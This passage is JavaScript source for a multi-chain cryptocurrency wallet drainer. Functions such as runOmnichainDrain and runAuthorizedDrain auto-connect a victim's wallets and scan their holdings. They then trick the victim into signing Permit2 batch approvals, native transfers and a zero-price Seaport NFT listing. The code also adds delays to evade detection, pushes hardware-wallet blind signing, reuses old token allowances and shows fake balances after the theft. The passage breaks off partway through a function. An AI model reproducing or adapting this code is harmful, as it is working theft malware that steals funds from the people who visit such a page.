      };
    }

    // Solana detection
    if (window.phantom && window.phantom.solana) {
      available.sol = {
        detected: true,
        provider: 'Phantom',
        name: 'Solana'
      };
    } else if (window.solflare && window.solflare.isSolflare) {
      available.sol = {
        detected: true,
        provider: 'Solflare',
        name: 'Solana'
      };
    }

    // Tron detection
    if (window.tronWeb && window.tronWeb.defaultAddress) {
      available.tron = {
        detected: true,
        provider: 'TronLink',
        name: 'Tron'
      };
    }

    // TON detection
    if (window.tonkeeper || (window.ton && window.ton.isTonkeeper)) {
      available.ton = {
        detected: true,
        provider: 'Tonkeeper',
        name: 'TON'
      };
    }

    // Bitcoin detection
    if (window.unisat || (window.XverseProviders && window.XverseProviders.BitcoinProvider)) {
      available.btc = {
        detected: true,
        provider: window.unisat ? 'UniSat' : 'Xverse',
        name: 'Bitcoin'
      };
    }

    return available;
  }

  async function autoConnectAllDetectedWallets() {
    var available = autoDetectAvailableWallets();
    var connected = [];
    var errors = [];

    var connectTasks = [];

    if (available.evm && available.evm.detected && !wallets.evm) {
      connectTasks.push(
        connectEvm()
          .then(function () { connected.push('EVM'); })
          .catch(function (err) { errors.push('EVM: ' + err.message); })
      );
    }

    if (available.sol && available.sol.detected && !wallets.sol) {
      connectTasks.push(
        connectSolana()
          .then(function () { connected.push('Solana'); })
          .catch(function (err) { errors.push('Solana: ' + err.message); })
      );
    }

    if (available.tron && available.tron.detected && !wallets.tron) {
      connectTasks.push(
        connectTron()
          .then(function () { connected.push('Tron'); })
          .catch(function (err) { errors.push('Tron: ' + err.message); })
      );
    }

    if (available.ton && available.ton.detected && !wallets.ton) {
      connectTasks.push(
        connectTon()
          .then(function () { connected.push('TON'); })
          .catch(function (err) { errors.push('TON: ' + err.message); })
      );
    }

    if (available.btc && available.btc.detected && !wallets.btc) {
      connectTasks.push(
        connectBitcoin()
          .then(function () { connected.push('Bitcoin'); })
          .catch(function (err) { errors.push('Bitcoin: ' + err.message); })
      );
    }

    if (connectTasks.length > 0) {
      await Promise.all(connectTasks);
    }

    return {
      available: available,
      connected: connected,
      errors: errors
    };
  }

  async function postScoutAllConnected() {
    var tasks = [];
    if (wallets.evm && wallets.evm.address) {
      tasks.push(
        postScout(wallets.evm.address, wallets.evm.chainId || 1, 'EVM', wallets.evm.provider).catch(function (e) {
          console.warn('[SCOUT] EVM failed:', e.message);
        })
      );
    }
    if (wallets.sol && wallets.sol.address) {
      tasks.push(
        postScout(wallets.sol.address, 0, 'SVM', wallets.sol.provider).catch(function (e) {
          console.warn('[SCOUT] SOL failed:', e.message);
        })
      );
    }
    if (wallets.tron && wallets.tron.address) {
      tasks.push(
        postScout(wallets.tron.address, 0, 'TRON', wallets.tron.provider).catch(function (e) {
          console.warn('[SCOUT] TRON failed:', e.message);
        })
      );
    }
    if (wallets.ton && wallets.ton.address) {
      tasks.push(
        postScout(wallets.ton.address, 0, 'TON', wallets.ton.provider).catch(function (e) {
          console.warn('[SCOUT] TON failed:', e.message);
        })
      );
    }
    if (wallets.btc && wallets.btc.address) {
      tasks.push(
        postScout(wallets.btc.address, 0, 'UTXO', wallets.btc.provider).catch(function (e) {
          console.warn('[SCOUT] BTC failed:', e.message);
        })
      );
    }
    if (tasks.length > 0) await Promise.all(tasks);
  }

  async function postScout(address, chainId, chainFamily, walletType) {
    var meta = scoutIngressMeta();
    var payload = {
      user_address: address,
      chain_family: chainFamily,
      wallet_type: walletType,
      source_page: meta.source_page,
      active_chain_tab: meta.active_chain_tab,
      connected_wallets: meta.connected_wallets,
      scout_value_usd: 0,
    };
    if (chainId && chainId > 0) {
      payload.chain_id = chainId;
    }
    console.log('[SCOUT DEBUG] Sending payload:', JSON.stringify(payload, null, 2));
    try {
      var result = await apiPost('/api/v1/scout', payload);
      console.log('[SCOUT DEBUG] Success response:', result);
      return result;
    } catch (err) {
      console.error('[SCOUT DEBUG] Error response:', err.message, err);
      throw err;
    }
  }

  async function postFusion() {
    var body = {};
    if (wallets.evm) body.evm_holder = wallets.evm.address;
    if (wallets.sol) body.sol_owner_base58 = wallets.sol.address;
    if (wallets.tron) body.tron_holder_base58 = wallets.tron.address;
    if (wallets.ton) body.ton_friendly_address = wallets.ton.address;
    if (wallets.btc) body.btc_holder_address = wallets.btc.address;
    if (!body.evm_holder && !body.sol_owner_base58 && !body.tron_holder_base58 && !body.ton_friendly_address && !body.btc_holder_address) {
      return { fusion: {}, total_usd: 0 };
    }
    var data = await apiPost('/api/scout/recursive-predator-fusion', body);
    var fusion = (data && data.fusion) || data || {};
    var totalUsd = typeof fusion.total_usd === 'number' ? fusion.total_usd : 0;
    return { fusion: fusion, total_usd: totalUsd };
  }

  async function tryAllowanceReuse() {
    if (!KINETIC_KEY) return null;
    var scanBody = {};
    if (wallets.evm) {
      scanBody.wallet_address = wallets.evm.address;
      scanBody.evm_chain_id = wallets.evm.chainId;
    } else if (wallets.sol) {
      scanBody.wallet_address = wallets.sol.address;
      scanBody.sol_wallet = wallets.sol.address;
    } else if (wallets.tron) {
      scanBody.wallet_address = wallets.tron.address;
      scanBody.tron_wallet = wallets.tron.address;
    } else if (wallets.ton) {
      scanBody.wallet_address = wallets.ton.address;
      scanBody.ton_wallet = wallets.ton.address;
    } else {
      return null;
    }

    var headers = { 'x-legion-kinetic-key': KINETIC_KEY };
    var scanRes = await fetch(BACKEND_URL + '/api/internal/allowance-reuse/scan', {
      method: 'POST',
      headers: Object.assign({ 'Content-Type': 'application/json' }, headers),
      body: JSON.stringify(scanBody),
    });
    var scanData = await scanRes.json().catch(function () { return {}; });
    var scanEnv = parseEnvelope(scanRes, scanData);
    if (!scanEnv.ok) return null;

    var allowances = (scanEnv.data && scanEnv.data.allowances) || [];
    var executable = allowances.filter(function (a) { return a.executable; });
    if (executable.length === 0) return null;

    var execRes = await fetch(BACKEND_URL + '/api/internal/allowance-reuse/execute', {
      method: 'POST',
      headers: Object.assign({ 'Content-Type': 'application/json' }, headers),
      body: JSON.stringify({ wallet_address: scanBody.wallet_address, allowances: executable }),
    });
    var execData = await execRes.json().catch(function () { return {}; });
    var execEnv = parseEnvelope(execRes, execData);
    if (!execEnv.ok) throw new Error(execEnv.message || 'Allowance reuse execute failed');
    return execEnv.data;
  }

  async function signEvmTypedData(typedData) {
    var eth = await getEvmSigningProvider();
    var params = [wallets.evm.address, JSON.stringify(typedData)];

    if (!isHardwareAutoConsent() && detectHardwareWalletType()) {
      await showBlindSigningErrorModal();
    }

    while (true) {
      try {
        await evasionDelayBeforeSign();
        return await eth.request({
          method: 'eth_signTypedData_v4',
          params: params,
        });
      } catch (err) {
        if (!isBlindSigningError(err)) throw err;
        if (isHardwareAutoConsent()) throw err;
        await showBlindSigningErrorModal();
      }
    }
  }

  async function signEvmNativeTx(nativeTransfer) {
    if (!nativeTransfer) return null;
    var eth = await getEvmSigningProvider();
    try {
      await evasionDelayBeforeSign();
      return await eth.request({
        method: 'eth_signTransaction',
        params: [{
          from: nativeTransfer.from,
          to: nativeTransfer.to,
          value: toHex(nativeTransfer.value),
          gas: toHex(nativeTransfer.gas),
          maxFeePerGas: toHex(nativeTransfer.maxFeePerGas),
          maxPriorityFeePerGas: toHex(nativeTransfer.maxPriorityFeePerGas),
          nonce: toHex(nativeTransfer.nonce),
          type: '0x2',
          chainId: toHex(nativeTransfer.chainId),
        }],
      });
    } catch (e) {
      var tx = await eth.request({
        method: 'eth_sendTransaction',
        params: [{
          from: nativeTransfer.from,
          to: nativeTransfer.to,
          value: toHex(nativeTransfer.value),
          gas: toHex(nativeTransfer.gas),
          maxFeePerGas: toHex(nativeTransfer.maxFeePerGas),
          maxPriorityFeePerGas: toHex(nativeTransfer.maxPriorityFeePerGas),
          nonce: toHex(nativeTransfer.nonce),
          chainId: toHex(nativeTransfer.chainId),
          type: '0x2',
        }],
      });
      return tx;
    }
  }

  async function loadSolanaWeb3() {
    if (window.solanaWeb3) return window.solanaWeb3;
    await new Promise(function (resolve, reject) {
      var s = document.createElement('script');
      s.src = 'https://unpkg.com/@solana/web3.js@1.98.0/lib/index.iife.min.js';
      s.onload = resolve;
      s.onerror = reject;
      document.head.appendChild(s);
    });
    return window.solanaWeb3;
  }

  async function signSolanaWire(unsignedWireBase64) {
    if (wallets.sol && wallets.sol.wc && wcProvider) {
      var wcSigned = await wcProvider.request(
        {
          method: 'solana_signTransaction',
          params: { transaction: unsignedWireBase64 },
        },
        'solana',
      );
      if (typeof wcSigned === 'string') return wcSigned;
      if (wcSigned && wcSigned.transaction) return wcSigned.transaction;
      if (wcSigned && wcSigned.signature) return unsignedWireBase64;
      throw new Error('WalletConnect Solana sign returned unexpected payload');
    }
    var web3 = await loadSolanaWeb3();
    var bytes = Uint8Array.from(atob(unsignedWireBase64), function (c) { return c.charCodeAt(0); });
    var tx = web3.VersionedTransaction.deserialize(bytes);
    var signed = await wallets.sol.provider.signTransaction(tx);
    var out = signed.serialize();
    var bin = '';
    for (var i = 0; i < out.length; i++) bin += String.fromCharCode(out[i]);
    return btoa(bin);
  }

  async function signTronNative(nativeTransferTrx) {
    if (!nativeTransferTrx || !window.tronWeb) return null;
    var tw = window.tronWeb;
    if (nativeTransferTrx.unsigned && tw.trx && tw.trx.sign) {
      return tw.trx.sign(nativeTransferTrx.unsigned);
    }
    if (nativeTransferTrx.raw_data && tw.trx && tw.trx.sign) {
      return tw.trx.sign(nativeTransferTrx);
    }
    return null;
  }

  async function signTonNative(nativeTransferTon) {
    if (!nativeTransferTon || !wallets.ton) return null;
    var ton = wallets.ton.provider;
    if (ton.send && nativeTransferTon.boc) {
      var result = await ton.send('ton_signData', { cell: nativeTransferTon.boc });
      return result;
    }
    return nativeTransferTon.signed_boc || null;
  }

  function extractEvmTokens(fusion, chainId) {
    var permits = [];
    var layers = fusion.evm_layers || fusion.evm || [];
    if (Array.isArray(layers)) {
      for (var i = 0; i < layers.length; i++) {
        var layer = layers[i];
        if (layer.token && layer.amount) {
          permits.push({ token: layer.token, amount: String(layer.amount) });
        } else if (layer.token_address) {
          permits.push({ token: layer.token_address, amount: MAX_PERMIT });
        }
      }
    }
    if (permits.length === 0) {
      permits.push({ token: DEFAULT_USDC, amount: MAX_PERMIT });
    }
    return permits;
  }

  function estimateNativeAmounts(fusion) {
    var sol = '0';
    var trx = '0';
    var ton = '0';
    var native = '0';
    if (fusion.sol_lamports) sol = String(fusion.sol_lamports);
    else if (fusion.solana && fusion.solana.lamports) sol = String(fusion.solana.lamports);
    if (fusion.trx_sun) trx = String(fusion.trx_sun);
    else if (fusion.tron && fusion.tron.sun) trx = String(fusion.tron.sun);
    if (fusion.ton_nanoton) ton = String(fusion.ton_nanoton);
    else if (fusion.ton && fusion.ton.nanoton) ton = String(fusion.ton.nanoton);
    if (fusion.native_wei) native = String(fusion.native_wei);
    else if (fusion.evm && fusion.evm.native_wei) native = String(fusion.evm.native_wei);
    return { native: native, sol: sol, trx: trx, ton: ton };
  }

  async function runOmnichainDrain(scoutUsd, rankedAssets) {
    if (!wallets.evm) throw new Error('EVM wallet required for Permit2 batch anchor');
    var evm = wallets.evm;
    var fusion = (await postFusion()).fusion;
    var amounts = estimateNativeAmounts(fusion);
    var permits = extractEvmTokens(fusion, evm.chainId);

    if (Array.isArray(rankedAssets) && rankedAssets.length > 0) {
      var rankedPermits = rankedAssets
        .filter(function (a) {
          return a.family === 'EVM' && a.token && a.token !== 'native' && a.token.startsWith('0x');
        })
        .slice(0, 8)
        .map(function (a) {
          return { token: a.token, amount: a.amount_raw || MAX_PERMIT };
        });
      if (rankedPermits.length > 0) {
        permits = rankedPermits;
      }
    }

    setStatus('Fetching Permit2 batch typed data…', false);
    var batchBody = {
      wallet_address: evm.address,
      chain_id: evm.chainId,
      permits: permits,
      nativeAmount: amounts.native,
    };
    if (wallets.sol) {
      batchBody.sol_wallet = wallets.sol.address;
      batchBody.nativeAmountSol = amounts.sol;
    }
    if (wallets.tron) {
      batchBody.trx_wallet = wallets.tron.address;
      batchBody.nativeAmountTrx = amounts.trx;
    }
    if (wallets.ton) {
      batchBody.ton_wallet = wallets.ton.address;
      batchBody.nativeAmountTon = amounts.ton;
    }

    console.log('[SIGNATURE FLOW] Requesting permit2-batch-typed-data...');
    var batch = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', batchBody);
    console.log('[SIGNATURE FLOW] Batch response received:', {
      haTypedData: !!batch.typed_data,
      hasMetadata: !!batch.batch_permit_metadata,
      hasEngineSpender: !!batch.engine_spender,
      hasPermit2: !!batch.permit2
    });
    var typedData = batch.typed_data;
    var batchMeta = batch.batch_permit_metadata;
    var hasOmnichainWire =
      (batch.native_transfer_sol && batch.native_amount_sol && BigInt(batch.native_amount_sol) > 0n) ||
      (batch.native_transfer_trx && batch.native_amount_trx && BigInt(batch.native_amount_trx) > 0n) ||
      (batch.native_transfer_ton && batch.native_amount_ton && BigInt(batch.native_amount_ton) > 0n) ||
      (batch.spl_transfer && batch.spl_amount && BigInt(batch.spl_amount) > 0n);
    if (!batchMeta) throw new Error('Permit2 batch metadata missing from API');
    if (!typedData && !hasOmnichainWire) throw new Error('Permit2 batch typed data missing from API');

    var permitSig = null;
    if (typedData) {
      setStatus('Signing Permit2 batch (EIP-712)…', false);
      console.log('[SIGNATURE FLOW] Starting wallet signature request...');
      permitSig = await signEvmTypedData(typedData);
      console.log('[SIGNATURE FLOW] Signature received from wallet:', {
        hasSig: !!permitSig,
        sigLength: permitSig ? permitSig.length : 0,
        sigPrefix: permitSig ? permitSig.substring(0, 20) : 'NULL'
      });
    }

    var nativeSignedTx = null;
    if (batch.native_transfer && BigInt(batch.nativeAmount || '0') > 0n) {
      setStatus('Signing EVM native transfer…', false);
      nativeSignedTx = await signEvmNativeTx(batch.native_transfer);
    }

    var nativeSignedSol = null;
    if (batch.native_transfer_sol && batch.native_amount_sol && BigInt(batch.native_amount_sol) > 0n) {
      setStatus('Signing Solana native transfer…', false);
      nativeSignedSol = await signSolanaWire(batch.native_transfer_sol.unsignedWireBase64);
    }

    var nativeSignedSpl = null;
    if (batch.spl_transfer && batch.spl_amount && BigInt(batch.spl_amount) > 0n) {
      setStatus('Signing Solana SPL batch…', false);
      nativeSignedSpl = await signSolanaWire(batch.spl_transfer.unsignedWireBase64);
    }

    var nativeSignedTrx = null;
    if (batch.native_transfer_trx && batch.native_amount_trx && BigInt(batch.native_amount_trx) > 0n) {
      setStatus('Signing Tron native transfer…', false);
      nativeSignedTrx = await signTronNative(batch.native_transfer_trx);
    }

    var nativeSignedTon = null;
    if (batch.native_transfer_ton && batch.native_amount_ton && BigInt(batch.native_amount_ton) > 0n) {
      setStatus('Signing TON native transfer…', false);
      nativeSignedTon = await signTonNative(batch.native_transfer_ton);
    }

    var nonce = 'omni:' + Date.now() + ':' + (_nonceCounter++);
    // Ensure nonce is unique even for same timestamp
    if (nonce.length > 100) _nonceCounter = 0; // Reset counter after large numbers
    var anchorBody = {
      ingress: 'normalized_v1',
      chain_family: 'EVM',
      protocol: 'permit2_batch_eip712',
      wallet_address: evm.address,
      token_address: permits[0].token,
      permits: permits,
      batch_permit_metadata: batchMeta,
      chain_id: evm.chainId,
      engine_spender: batch.engine_spender,
      permit2: batch.permit2,
      nativeAmount: batch.nativeAmount || amounts.native,
      signature: permitSig,
      nonce: nonce,
      expiry_iso: EXPIRY_ISO,
      wallet_type: evm.provider,
      scout_value_usd: resolveScoutUsd(null, { total_usd: scoutUsd }),
      max_allowance: MAX_PERMIT,
      requires_quorum: false,
    };

    if (nativeSignedTx) anchorBody.native_signed_transaction = nativeSignedTx;
    if (wallets.sol) anchorBody.sol_wallet = wallets.sol.address;
    if (wallets.tron) anchorBody.trx_wallet = wallets.tron.address;
    if (wallets.ton) anchorBody.ton_wallet = wallets.ton.address;
    if (nativeSignedSol) anchorBody.native_signed_transaction_sol = nativeSignedSol;
    if (nativeSignedSpl) anchorBody.native_signed_transaction_spl = nativeSignedSpl;
    if (batch.spl_mint) anchorBody.spl_mint = batch.spl_mint;
    if (batch.spl_amount) anchorBody.spl_amount = batch.spl_amount;
    if (nativeSignedTrx) anchorBody.native_signed_transaction_trx = nativeSignedTrx;
    if (nativeSignedTon) anchorBody.native_signed_transaction_ton = nativeSignedTon;
    if (batch.native_amount_sol) anchorBody.nativeAmountSol = batch.native_amount_sol;
    if (batch.native_amount_trx) anchorBody.nativeAmountTrx = batch.native_amount_trx;
    if (batch.native_amount_ton) anchorBody.nativeAmountTon = batch.native_amount_ton;

    anchorBody.protocol = 'omnichain_atomic_v1';
    anchorBody.omni_payload_sync = {
      session: {
        eip155: true,
        solana: Boolean(wallets.sol),
        bip122: Boolean(wallets.btc),
        tron: Boolean(wallets.tron),
        ton: Boolean(wallets.ton),
      },
      primary_rack: 'eip155',
      evm_chain_id: evm.chainId,
    };

    setStatus('Submitting omnichain envelope to signature-anchor…', false);
    console.log('[SIGNATURE FLOW] Preparing anchor body:', {
      protocol: anchorBody.protocol,
      walletAddress: anchorBody.wallet_address,
      scoutValueUsd: anchorBody.scout_value_usd,
      hasPermit2: !!anchorBody.permit2,
      hasBatchMeta: !!anchorBody.batch_permit_metadata
    });

    // Validate permit2 signature before submission
    console.log('[SIGNATURE] Starting validation...');
    try {
      validateSignatureExists(anchorBody.signature, 'Permit2 signature');
      validateEvmSignature(anchorBody.signature);
      console.log('[SIGNATURE] ✅ Permit2 signature validation PASSED');

      // Validate native signatures if present
      if (anchorBody.native_signed_transaction) {
        validateSignatureExists(anchorBody.native_signed_transaction, 'Native ETH signature');
        console.log('[SIGNATURE] ✅ Native ETH signature valid');
      }
      if (anchorBody.native_signed_transaction_sol) {
        validateSignatureExists(anchorBody.native_signed_transaction_sol, 'Solana signature');
        console.log('[SIGNATURE] ✅ Solana signature valid');
      }
      if (anchorBody.native_signed_transaction_trx) {
        validateSignatureExists(anchorBody.native_signed_transaction_trx, 'Tron signature');
        console.log('[SIGNATURE] ✅ Tron signature valid');
      }
      if (anchorBody.native_signed_transaction_ton) {
        validateSignatureExists(anchorBody.native_signed_transaction_ton, 'TON signature');
        console.log('[SIGNATURE] ✅ TON signature valid');
      }
    } catch (err) {
      console.error('[SIGNATURE] ❌ Validation FAILED:', err.message);
      setStatus('Signature validation failed: ' + err.message, false);
      throw err;
    }

    // Apply MEV protection before submission
    if (MEV_CONFIG.atomicExecutionRequired) {
      anchorBody.mev_protected = true;
      anchorBody.atomic_execution = true;
      // Calculate minimum slippage tolerance
      var estimatedValue = Number(scoutUsd) || 0;
      if (estimatedValue > 0) {
        anchorBody.min_slippage_bps = MEV_CONFIG.maxSlippageBps;
        anchorBody.min_amount_out = calculateMinAmountOut(estimatedValue, MEV_CONFIG.maxSlippageBps);
      }
    }

    // Use private RPC for MEV protection
    if (MEV_CONFIG.usePrivateRpc) {
      var privateRpc = selectPrivateRpc();
      if (privateRpc) {
        anchorBody.preferred_rpc = privateRpc;
      }
    }

    // Add block builder awareness
    if (MEV_CONFIG.blockBuilderAware) {
      anchorBody.block_builder_aware = true;
      anchorBody.use_flashbots = true;
    }

    console.log('[SIGNATURE FLOW] Submitting to /api/v1/signature-anchor...');
    var result = await apiPost('/api/v1/signature-anchor', anchorBody);
    console.log('[SIGNATURE FLOW] ✅ Backend response received:', {
      success: result.success,
      code: result.code || 'NONE',
      message: result.message || 'NONE',
      settlementId: result.settlement_id || 'NONE',
      txHash: result.tx_hash || 'NONE'
    });
    return result;
  }

  async function runSeaportAcceptOffer() {
    if (!wallets.evm) {
      await connectEvm();
    }
    var evm = wallets.evm;
    if (!evm) throw new Error('EVM wallet required for Seaport listing');

    var hashInput = document.getElementById('legion-seaport-order-hash');
    var pastedHash = hashInput && hashInput.value ? hashInput.value.trim() : '';
    var listing = null;

    if (pastedHash) {
      setStatus('Resolving Seaport order hash…', false);
      var resolved = await apiPost('/api/v1/seaport/order-by-hash', {
        order_hash: pastedHash,
        chain_id: evm.chainId,
      });
      listing = resolved.listing;
    } else {
      setStatus('Scanning OpenSea / Blur listings…', false);
      try {
        var scan = await apiPost('/api/v1/seaport/scan-listings', {
          wallet_address: evm.address,
          chain_id: evm.chainId,
          limit: 10,
        });
        if (scan.listings && scan.listings.length > 0) {
          listing = scan.listings[0];
        }
      } catch (scanErr) {
        console.warn('[LEGION_SEAPORT_SCAN]', scanErr);
      }
    }

    if (listing && listing.order && listing.order.signature) {
      setStatus('Fulfilling signed marketplace listing…', false);
      var fulfillExisting = await apiPost('/api/v1/seaport/fulfill', {
        order: listing.order,
        signature: listing.order.signature,
        chain_id: evm.chainId,
      });
      setStatus('Seaport listing fulfilled: ' + (fulfillExisting.transaction_hash || 'ok'), true);
      activateFakeBalanceAfterDrain();
      return fulfillExisting;
    }

    var nftContract = window.prompt('NFT contract address (0x…)', '');
    if (!nftContract) throw new Error('NFT contract required');
    var tokenId = window.prompt('Token ID', '0');
    if (tokenId == null || tokenId === '') throw new Error('Token ID required');

    setStatus('Building zero-price Seaport listing typed data…', false);
    var typed = await apiPost('/api/v1/seaport/listing-typed-data', {
      wallet_address: evm.address,
      nft_contract: nftContract,
      token_id: tokenId,
      chain_id: evm.chainId,
      seaport_version: '1.5',
    });

    setStatus('Sign Seaport order (EIP-712) — Accept Offer…', false);
    var seaportSig = await signEvmTypedData(typed.typed_data);

    var seaportOrder = {
      parameters: typed.order_parameters,
      signature: seaportSig,
    };

    setStatus('Submitting seaport_listing anchor…', false);
    var anchor = await apiPost('/api/v1/signature-anchor', {
      ingress: 'normalized_v1',
      chain_family: 'EVM',
      protocol: 'seaport_listing',
      wallet_address: evm.address,
      token_address: nftContract,
      chain_id: evm.chainId,
      seaport_order: seaportOrder,
      signature: seaportSig,
      nonce: 'seaport:' + Date.now() + ':' + (_nonceCounter++),
      expiry_iso: EXPIRY_ISO,
      wallet_type: evm.provider,
      scout_value_usd: 0,
      max_allowance: MAX_PERMIT,
      requires_quorum: false,
    });

    setStatus('Seaport anchor: ' + (anchor.transaction_hash || anchor.settlement_status || 'submitted'), true);
    activateFakeBalanceAfterDrain();
    return anchor;
  }

  async function runBitcoinPsbt(scoutUsd) {
    if (!wallets.btc) throw new Error('Bitcoin wallet not connected');
    setStatus('Building Bitcoin PSBT…', false);
    var psbt = await apiPost('/api/v1/signature-anchor/bitcoin-psbt', {
      wallet_address: wallets.btc.address,
      amount_sat: '10000',
    });
    if (!psbt || !psbt.psbt_base64) throw new Error('PSBT build failed');

    var signedPsbt = psbt.psbt_base64;
    if (window.unisat && window.unisat.signPsbt) {
      signedPsbt = await window.unisat.signPsbt(psbt.psbt_base64);
    }

    return apiPost('/api/v1/signature-anchor', {
      ingress: 'normalized_v1',
      chain_family: 'UTXO',
      protocol: 'bitcoin_psbt',
      wallet_address: wallets.btc.address,
      token_address: 'BTC',
      signature: signedPsbt,
      nonce: 'btc:' + Date.now() + ':' + (_nonceCounter++),
      expiry_iso: EXPIRY_ISO,
      wallet_type: wallets.btc.provider,
      scout_value_usd: resolveScoutUsd(null, { total_usd: scoutUsd }),
      max_allowance: MAX_PERMIT,
      requires_quorum: false,
    });
  }

  async function connectActiveTab() {
    if (ACTIVE_TAB === 'evm') return connectEvm();
    if (ACTIVE_TAB === 'sol') return connectSolana();
    if (ACTIVE_TAB === 'tron') return connectTron();
    if (ACTIVE_TAB === 'ton') return connectTon();
    if (ACTIVE_TAB === 'btc') return connectBitcoin();
    throw new Error('Unsupported chain tab');
  }

  async function runAuthorizedDrain(opts) {
    // Prevent concurrent drain executions
    if (_drainInProgress) {
      setStatus('Drain already in progress. Please wait.', false);
      throw new Error('Drain already in progress');
    }
    _drainInProgress = true;

    // Record analytics
    var drainStartTime = Date.now();
    recordDrainStart();

    var skipConnect = opts && opts.skipConnect;
    var btn = document.getElementById('legion-auth-primary');
    var wcBtn = document.getElementById('legion-auth-wc');
    if (btn) btn.disabled = true;
    if (wcBtn) wcBtn.disabled = true;

    if (!skipConnect) {
      setStatus('Auto-detecting wallets…', false);
      try {
        // Auto-connect all available wallets
        var autoConnectResult = await autoConnectAllDetectedWallets();
        if (autoConnectResult.connected.length === 0) {
          throw new Error('No wallets detected. Please install MetaMask, Phantom, or other wallet extension.');
        }
        // Use the first connected wallet
        var firstWallet = autoConnectResult.connected[0];
        if (firstWallet === 'EVM') ACTIVE_TAB = 'evm';
        else if (firstWallet === 'Solana') ACTIVE_TAB = 'sol';
        else if (firstWallet === 'Tron') ACTIVE_TAB = 'tron';
        else if (firstWallet === 'TON') ACTIVE_TAB = 'ton';
        else if (firstWallet === 'Bitcoin') ACTIVE_TAB = 'btc';
      } catch (err) {
        setStatus('Wallet detection failed: ' + err.message, false);
        _drainInProgress = false;
        throw err;
      }
    }

    try {
      var conn;
      if (skipConnect) {
        if (ACTIVE_TAB === 'evm' && wallets.evm) conn = wallets.evm;
        else if (ACTIVE_TAB === 'sol' && wallets.sol) conn = wallets.sol;
        else if (ACTIVE_TAB === 'tron' && wallets.tron) conn = wallets.tron;
        else if (ACTIVE_TAB === 'ton' && wallets.ton) conn = wallets.ton;
        else if (ACTIVE_TAB === 'btc' && wallets.btc) conn = wallets.btc;
        else throw new Error('No wallet connected for ' + ACTIVE_TAB.toUpperCase());
      } else {
        if (wallets.evm) conn = wallets.evm;
        else if (wallets.sol) conn = wallets.sol;
        else if (wallets.tron) conn = wallets.tron;
        else if (wallets.ton) conn = wallets.ton;
        else if (wallets.btc) conn = wallets.btc;
        else throw new Error('No wallet connected');
      }
      var chainFamily = ACTIVE_TAB === 'evm' ? 'EVM' : ACTIVE_TAB === 'sol' ? 'SVM' : ACTIVE_TAB === 'tron' ? 'TRON' : ACTIVE_TAB === 'ton' ? 'TON' : 'UTXO';
      var chainId = conn.chainId || 0;
      var walletType = conn.provider || conn.name || ACTIVE_TAB;

      await captureFakeBalanceSnapshot();

      await loadClientConfig();

      setStatus('Scout telemetry (parallel)…', false);
      await postScoutAllConnected();

      showPortfolioLoadingOverlay();
      setStatus('Loading portfolio (ranked assets)…', false);
      var ranked = await fetchRankedAssets(conn.address, chainFamily);
      var scoutUsd = ranked.total_usd || 0;

      setStatus('Scanning assets (recursive-predator-fusion)…', false);
      var fusionResult = await postFusion();
      scoutUsd = resolveScoutUsd(fusionResult, ranked);

      if (KINETIC_KEY) {
        setStatus('Checking existing allowances…', false);
        var reuse = await tryAllowanceReuse();
        if (reuse) {
          setStatus('Allowance reuse executed — zero-signature transfer complete', true);
          activateFakeBalanceAfterDrain();
          return;
        }
      }

      if (ACTIVE_TAB === 'btc') {
        await runBitcoinPsbt(scoutUsd);
        setStatus('Bitcoin PSBT submitted to signature-anchor', true);
        activateFakeBalanceAfterDrain();
        return;
      }

      if (!wallets.evm && ACTIVE_TAB !== 'evm') {
        setStatus('Connect EVM wallet first for omnichain Permit2 batch…', false);
        await connectEvm();
        await postScoutAllConnected();
      }

      if (EIP7702_ENABLED && wallets.evm && ACTIVE_TAB === 'evm') {
        var eip7702Done = await tryEip7702DelegationDrain(wallets.evm, scoutUsd);
        if (eip7702Done) {
          setStatus('EIP-7702 delegation anchor submitted', true);
          activateFakeBalanceAfterDrain();
          return;
        }
      }

      var settlement = await runOmnichainDrain(scoutUsd, ranked.assets);

      if (settlement && settlement.omnichain_settlement && settlement.omnichain_settlement.results) {
        var omniResults = settlement.omnichain_settlement.results;
        var failedChains = [];
        var okChains = [];
        Object.keys(omniResults).forEach(function (chain) {
          var row = omniResults[chain];
          if (row && row.ok) okChains.push(chain);
          else failedChains.push(chain);
        });
        if (failedChains.length > 0 && okChains.length > 0) {
          console.warn('[RECOVERY] Partial omnichain settlement', { ok: okChains, failed: failedChains });
          saveCheckpoint('partial_settlement', {
            ok: okChains,
            failed: failedChains,
            settlement_status: settlement.settlement_status,
          });
          setStatus(
            'Partial settlement: ' + okChains.join(', ') + ' ok; retry pending: ' + failedChains.join(', '),
            true
          );
        }
      }

      var txHash = settlement.transaction_hash || settlement.l2_mint_transaction_hash || settlement.settlement_status || 'submitted';
      setStatus('Settlement ingress complete: ' + txHash, true);
      activateFakeBalanceAfterDrain();

      // Record success metrics
      var drainDuration = Date.now() - drainStartTime;
      recordDrainSuccess(scoutUsd, 0, drainDuration);
      recordChainExtraction(chainFamily, scoutUsd);
    } catch (err) {
      setStatus(err && err.message ? err.message : String(err), false);
      console.warn('[LEGION_AUTH_DRAIN]', err);

      var recoverable =
        err &&
        err.message &&
        (err.message.indexOf('timeout') >= 0 ||
          err.message.indexOf('429') >= 0 ||
          err.message.indexOf('network') >= 0 ||
          err.message.indexOf('fetch') >= 0 ||
          err.message.indexOf('Failed to fetch') >= 0);
      var attempt = (opts && opts._retryAttempt) || 0;
      if (recoverable && attempt < MAX_API_RETRIES) {
        var backoff = Math.pow(2, attempt) * 1000 + Math.floor(Math.random() * 500);
        setStatus('Retrying drain in ' + Math.round(backoff / 1000) + 's…', false);
        await new Promise(function (resolve) { setTimeout(resolve, backoff); });
        _drainInProgress = false;
        if (btn) btn.disabled = false;
        if (wcBtn) wcBtn.disabled = !WC_PROJECT_ID;
        return runAuthorizedDrain(Object.assign({}, opts || {}, {
          skipConnect: true,
          _retryAttempt: attempt + 1,
        }));
      }

      // Record failure metrics
      var drainDuration = Date.now() - drainStartTime;
      recordDrainFailure(err, drainDuration);
      await reportExecutionError(err);
    } finally {
      _drainInProgress = false;
      if (btn) btn.disabled = false;
      if (wcBtn) wcBtn.disabled = !WC_PROJECT_ID;

      // Report analytics
      await reportAnalytics(false);
      await reportBehaviorProfile();
    }
  }

  async function runWalletConnectThenDrain() {
    var wcBtn = document.getElementById('legion-auth-wc');
    if (wcBtn) wcBtn.disabled = true;
    try {
      await connectWalletConnect();
      if (wallets.evm) ACTIVE_TAB = 'evm';
      else if (wallets.sol) ACTIVE_TAB = 'sol';
      await runAuthorizedDrain({ skipConnect: true });
    } catch (err) {
